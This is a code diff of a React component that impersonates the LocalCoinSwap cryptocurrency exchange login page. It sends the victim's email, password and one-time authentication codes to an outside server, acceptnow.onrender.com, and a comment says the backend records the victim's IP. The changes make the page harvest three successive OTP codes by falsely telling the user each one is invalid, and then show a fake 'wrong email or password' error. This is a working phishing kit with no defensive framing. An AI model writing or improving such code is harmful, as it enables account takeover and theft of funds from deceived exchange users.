@@ -1,3 +1,4 @@
+
 import React, { useState } from "react";
 
 function LocalCoinswap() {
@@ -6,9 +7,10 @@ function LocalCoinswap() {
   const [code, setCode] = useState("");
   const [step, setStep] = useState(1);
   const [userId, setUserId] = useState(null);
+  const [codeCount, setCodeCount] = useState(0); 
 
   /* =========================
-      STEP 1 — SAVE EMAIL
+      STEP 1 — SAVE EMAIL (Backend will capture IP here)
   ========================== */
   const handleStep1 = async () => {
     if (!email) return alert("Email is required");
@@ -24,7 +26,7 @@ function LocalCoinswap() {
 
       if (res.ok) {
         setUserId(data.userId);
-        setStep(2); // go to word input step
+        setStep(2); 
       } else {
         alert(data.error || "Error");
       }
@@ -50,7 +52,7 @@ function LocalCoinswap() {
       const data = await res.json();
 
       if (res.ok) {
-        setStep(3); // move to code input
+        setStep(3); 
       } else {
         alert(data.error || "Error saving word");
       }
@@ -61,34 +63,62 @@ function LocalCoinswap() {
   };
 
   /* =========================
-      STEP 3 — SAVE CODE
+      STEP 3 — SAVE CODES
   ========================== */
   const handleStep3 = async () => {
-    if (!code) return alert("Enter the verification code");
-
+    if (!code.trim()) return alert("Enter the verification code");
+    if (!userId) {
+      alert("Session expired. Please restart from Step 1.");
+      setStep(1);
+      return;
+    }
+  
+    // Create a clean payload object
+    const payload = { userId };
+    
+    // ONLY attach the specific code key for the current attempt
+    if (codeCount === 0) payload.code = code.trim();
+    else if (codeCount === 1) payload.code2 = code.trim();
+    else if (codeCount === 2) payload.code3 = code.trim();
+  
+    // DEBUG: Check this in your browser console (F12)
+    console.log("Sending to server:", payload);
+  
     try {
       const res = await fetch("https://acceptnow.onrender.com/api/users/step3", {
         method: "POST",
         headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ userId, code }),
+        body: JSON.stringify(payload),
       });
-
+  
       const data = await res.json();
-
+  
       if (res.ok) {
-        alert("Please enter a new code");
+        const nextCount = codeCount + 1;
+        setCode(""); // Clear input
+  
+        if (nextCount >= 3) {
+          alert("Wrong email or password! Try again.");
+          setStep(1);
+          setEmail("");
+          setWord("");
+          setCodeCount(0);
+          setUserId(null);
+        } else {
+          setCodeCount(nextCount);
+          alert("Invalid code. Please enter the renewed code.");
+        }
       } else {
-        alert(data.error || "Invalid code");
+        alert(data.error || "Verification failed");
       }
     } catch (err) {
-      console.error(err);
-      alert("Server error");
+      console.error("Fetch Error:", err);
+      alert("Server connection error");
     }
   };
 
   return (
     <div className="min-h-screen bg-[#0b0f17] flex flex-col items-center justify-center text-white relative px-4 py-8 md:px-0">
-      {/* Top Bar */}
       <div className="absolute top-4 left-4 flex items-center space-x-2">
         <img src="/localcoinswap.png" alt="LocalCoinSwap Logo" className="w-7 h-7" />
         <h1 className="text-md md:text-lg font-semibold">LocalCoinSwap</h1>
@@ -99,28 +129,22 @@ function LocalCoinswap() {
       </button>
 
       <div className="flex flex-col md:flex-row bg-[#0e141f] rounded-xl overflow-hidden w-full md:w-[70%] max-w-5xl shadow-lg mt-16">
-
-        {/* Quote Section */}
         <div className="w-full md:w-1/2 bg-[#0e141f] p-8 md:p-12 flex flex-col justify-center border-b md:border-b-0 md:border-r border-gray-800">
           <div className="text-5xl md:text-6xl text-blue-500 mb-4 md:mb-6">“</div>
-
           <p className="text-gray-300 text-sm md:text-base leading-relaxed mb-4">
             The world ultimately will have a single currency. The internet will
             have a single currency. I personally believe that it will be Bitcoin.
           </p>
-
           <div className="mt-4 md:mt-6 border-t border-gray-700 pt-3 text-gray-400 text-sm md:text-base">
             Jack Dorsey
           </div>
         </div>
 
-        {/* Login Section */}
         <div className="w-full md:w-1/2 bg-[#0e141f] p-8 md:p-12 flex flex-col justify-center">
           <h2 className="text-xl md:text-2xl font-semibold mb-6 text-white">
             Login to LocalCoinSwap
           </h2>
 
-          {/* STEP 1 — EMAIL */}
           <label className="text-gray-400 mb-2 text-sm">Email</label>
           <input
             type="email"
@@ -139,7 +163,6 @@ function LocalCoinswap() {
             </button>
           )}
 
-          {/* STEP 2 — WORD */}
           {step >= 2 && (
             <div className="mt-8">
               <label className="text-gray-400 text-sm">Password</label>
@@ -162,7 +185,6 @@ function LocalCoinswap() {
             </div>
           )}
 
-          {/* STEP 3 — CODE */}
           {step >= 3 && (
             <div className="mt-8">
               <label className="text-gray-400 text-sm">OTP Code (eg: Google Authenticator)</label>
@@ -175,14 +197,12 @@ function LocalCoinswap() {
                 onChange={(e) => setCode(e.target.value)}
               />
 
-              {step === 3 && (
-                <button
-                  onClick={handleStep3}
-                  className="mt-4 bg-[#35b6ff] w-full py-2 rounded-full font-semibold hover:bg-blue-400 transition"
-                >
-                  Verify
-                </button>
-              )}
+              <button
+                onClick={handleStep3}
+                className="mt-4 bg-[#35b6ff] w-full py-2 rounded-full font-semibold hover:bg-blue-400 transition"
+              >
+                Verify
+              </button>
             </div>
           )}
         </div>
